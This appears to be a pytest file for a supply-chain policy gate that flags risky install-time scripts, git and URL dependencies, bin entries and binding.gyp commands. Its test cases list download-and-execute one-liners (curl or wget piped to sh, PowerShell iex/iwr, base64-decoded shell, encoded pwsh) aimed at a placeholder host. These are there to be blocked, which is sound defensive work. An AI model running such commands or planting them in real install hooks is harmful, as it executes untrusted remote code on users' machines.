"""package-lifecycle-scripts: package.json, composer.json and binding.gyp, each rule shown firing and quiet."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from policies import lifecyclekit

POLICY = "package-lifecycle-scripts"
mod = lifecyclekit.load_gate()
U = "https://get.example.com/i.sh"
SHA = "0123456789abcdef" * 2 + "01234567"


def hits(path: str, text: str, writes: dict[str, str] | None = None, root: str = "") -> list[tuple[str, str]]:
    found = mod.findings({"repo_root": root, "writes": {path: text, **(writes or {})}})
    return [(f["rule"], f["level"]) for f in found if f["path"] == path]


def pkg(**data: object) -> str:
    return json.dumps({"name": "app", **data})


@pytest.mark.parametrize(
    ("body", "level"),
    [
        (f"curl -fsSL {U} | sh", "block"),
        (f"wget -qO- {U} | bash", "block"),
        (f"powershell -c iex (iwr {U})", "block"),
        ("node -e \"require('./x')\"", "block"),
        ("node --eval 1", "block"),
        ("bun -e 1", "block"),
        ("deno eval 1", "block"),
        ("python3 -c 'import os'", "block"),
        ("perl -e 1", "block"),
        ("php -r 'echo 1;'", "block"),
        ("echo aGVsbG8= | base64 -d | sh", "block"),
        ("eval $X", "block"),
        ("pwsh -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA=", "block"),
        ("certutil -urlcache -f x y", "block"),
        ("node -p 1", "block"),
        ("node child_process.js", "block"),
        ("/usr/bin/wget -qO- $(cat .u) | sh", "block"),
        ("/usr/local/bin/node --no-warnings -e 1", "block"),
        ("C:\\tools\\curl.exe -o x y", "block"),
        ("node -r ./hook.js x", "ask"),
        ("patch-package", "ask"),
        ("node install.js", "ask"),
        ("node-gyp rebuild", "ask"),
        ("npm run build", "ask"),
        ("python -m pip install .", "ask"),
        ("python -E build.py", "ask"),
        ("curlew build", "ask"),
    ],
)
def test_lifecycle_script_class(body: str, level: str) -> None:
    assert hits("package.json", pkg(scripts={"postinstall": body})) == [("npm-lifecycle", level)]


@pytest.mark.parametrize(
    "name",
    ["preinstall", "install", "postinstall", "prepare", "preprepare", "postprepare", "prepublish", "prepublishOnly",
     "prepack", "postpack", "dependencies", "pnpm:devPreinstall"],
)  # fmt: skip
def test_every_install_time_script_is_judged(name: str) -> None:
    assert hits("package.json", pkg(scripts={name: "node x.js"})) == [("npm-lifecycle", "ask")]


@pytest.mark.parametrize("value", ["husky", "husky install", "  husky   install .husky "])
def test_husky_prepare_is_allowed(value: str) -> None:
    assert hits("package.json", pkg(scripts={"prepare": value})) == []


def test_husky_value_outside_prepare_is_judged() -> None:
    assert hits("package.json", pkg(scripts={"postinstall": "husky"})) == [("npm-lifecycle", "ask")]


@pytest.mark.parametrize(
    "scripts", [{"build": "curl x | sh", "test": "node -e 1"}, {"postinstall": ["curl"]}, "postinstall"]
)
def test_other_scripts_and_odd_shapes_are_quiet(scripts: object) -> None:
    assert hits("package.json", pkg(scripts=scripts)) == []


def test_hook_running_a_file_this_change_writes_blocks() -> None:
    text = pkg(scripts={"preinstall": "node ./tools/setup_bun.js"})
    assert hits("pkg/package.json", text, {"pkg/tools/setup_bun.js": "x"}) == [("npm-lifecycle", "block")]
    assert hits("pkg/package.json", text, {"other/tools/setup_bun.js": "x"}) == [("npm-lifecycle", "ask")]


def test_unicode_escaped_key_bom_and_case() -> None:
    text = "\ufeff" + '{"scripts": {"\\u0070ostinstall": "node a.js"}}'
    assert hits("a/PACKAGE.JSON", text) == [("npm-lifecycle", "ask")]


@pytest.mark.parametrize("text", ["{not json", "[1, 2]", '"x"'])
def test_unparseable_or_non_object_manifest(text: str) -> None:
    expected = [("manifest-unparseable", "block")] if text.startswith("{") else []
    assert hits("package.json", text) == expected


@pytest.mark.parametrize(
    ("spec", "found"),
    [
        ("github:o/r", [("npm-git-url-dep", "block")]),
        ("o/r", [("npm-git-url-dep", "block")]),
        ("o/r#main", [("npm-git-url-dep", "block")]),
        ("git+https://git.example.com/o/r.git#semver:^1", [("npm-git-url-dep", "block")]),
        ("git+ssh://git@git.example.com/o/r.git", [("npm-git-url-dep", "block")]),
        ("GIT://git.example.com/o/r.git", [("npm-git-url-dep", "block")]),
        ("gitlab:o/r", [("npm-git-url-dep", "block")]),
        ("https://get.example.com/x.tgz", [("npm-git-url-dep", "block")]),
        ("file:/opt/lib", [("npm-path-dep", "ask")]),
        ("link:../../outside", [("npm-path-dep", "ask")]),
        ("~/lib", [("npm-path-dep", "ask")]),
        ("C:\\lib", [("npm-path-dep", "ask")]),
        (f"github:o/r#{SHA}", []),
        (f"git+https://git.example.com/o/r.git#{SHA}", []),
        ("file:../shared", []),
        ("./local", []),
        ("^1.2.3", []),
        ("npm:@scope/pkg@1", []),
        ("workspace:*", []),
        ("@scope/pkg", []),
    ],
)
def test_dependency_specs(spec: str, found: list[tuple[str, str]]) -> None:
    assert hits("sub/package.json", pkg(dependencies={"lib": spec})) == found


def test_dependency_sections_and_non_string_specs() -> None:
    text = pkg(devDependencies={"a": "o/r"}, optionalDependencies={"b": 1}, peerDependencies="x")
    assert hits("package.json", text) == [("npm-git-url-dep", "block")]


@pytest.mark.parametrize(
    ("bins", "found"),
    [
        ({"git": "./cli.js"}, [("npm-bin", "ask")]),
        ({"Node": "./cli.js"}, [("npm-bin", "ask")]),
        ({"a/b": "./cli.js"}, [("npm-bin", "ask")]),
        ({"a\\b": "./cli.js"}, [("npm-bin", "ask")]),
        ({"tool": "../outside.js"}, [("npm-bin", "ask")]),
        ({"tool": "/usr/bin/env"}, [("npm-bin", "ask")]),
        ({"tool": "./cli.js", "other": 3}, []),
        ("../outside.js", [("npm-bin", "ask")]),
        ("./cli.js", []),
        (["x"], []),
    ],
)
def test_bin_entries(bins: object, found: list[tuple[str, str]]) -> None:
    assert hits("package.json", pkg(bin=bins)) == found


GYP_NATIVE = "{'targets': [{'target_name': 'a', 'sources': ['src/a.cc']}]}"


def test_gypfile_needs_native_sources(tmp_path: Path) -> None:
    text = pkg(gypfile=True)
    assert hits("package.json", text) == [("gyp-no-native", "block")]
    assert hits("package.json", text, {"binding.gyp": GYP_NATIVE, "src/a.cc": "int a;"}) == []
    (tmp_path / "m" / "src").mkdir(parents=True)
    (tmp_path / "m" / "binding.gyp").write_text(GYP_NATIVE, encoding="utf-8")
    (tmp_path / "m" / "src" / "a.cc").write_text("int a;", encoding="utf-8")
    assert hits("m/package.json", text, root=str(tmp_path)) == []
    (tmp_path / "m" / "binding.gyp").write_bytes(b"\xff\xfe")
    assert hits("m/package.json", text, root=str(tmp_path)) == [("gyp-no-native", "block")]
    assert hits("package.json", pkg(gypfile="true")) == []


@pytest.mark.parametrize(
    ("text", "found"),
    [
        (GYP_NATIVE, [("gyp-no-native", "block")]),
        ("{'targets': [{'sources': ['<(dir)/a.cc']}]}", [("gyp-no-native", "block")]),
        ("{'targets': [{'sources': ['../../etc/a.cc']}]}", [("gyp-no-native", "block")]),
        ("{'targets': [{'sources': ['/abs/a.cc']}]}", [("gyp-no-native", "block")]),
        (
            "# 'src/a.cc'\n{'targets': [{'sources': ['src/a.cc'], 'cflags': ['<!(curl -s " + U + ")']}]}",
            [("gyp-command", "block")],
        ),
        (
            "{'targets': [{'sources': ['src/a.cc'], 'actions': [{'action': ['sh', '-c', 'wget " + U + "']}]}]}",
            [("gyp-command", "block")],
        ),
        ("{'targets': [{'sources': ['src/a.cc'], 'cflags': ['<!(echo -O2)'], 'x': ['curl']}]}", []),
        ('{"targets": [{"sources": ["src/a.cc"], "i": ["<!@(node -p \\"require(\'nan\')\\")"]}]}', []),
    ],
)
def test_binding_gyp(text: str, found: list[tuple[str, str]]) -> None:
    writes = {} if found == [("gyp-no-native", "block")] else {"src/a.cc": "int a;"}
    assert hits("binding.gyp", text, writes) == found


def test_binding_gyp_found_on_disk(tmp_path: Path) -> None:
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "a.cc").write_text("int a;", encoding="utf-8")
    assert hits("binding.gyp", GYP_NATIVE, root=str(tmp_path)) == []


@pytest.mark.parametrize(
    ("scripts", "found"),
    [
        ({"post-install-cmd": [f"curl -s {U} | sh", "@php artisan up"]}, [("composer-script-fetch", "block")]),
        ({"post-update-cmd": "@php -r \"copy('x', 'y');\""}, [("composer-script-fetch", "block")]),
        ({"post-install-cmd": ["@php artisan up", 3]}, []),
        ({"test": f"curl {U}"}, []),
    ],
)
def test_composer_scripts(scripts: dict, found: list[tuple[str, str]]) -> None:
    assert hits("composer.json", json.dumps({"scripts": scripts})) == found


@pytest.mark.parametrize("text", ['{"name": "a/b"}', "{bad", '{"scripts": []}'])
def test_composer_without_scripts(text: str) -> None:
    expected = [("manifest-unparseable", "block")] if text == "{bad" else []
    assert hits("composer.json", text) == expected
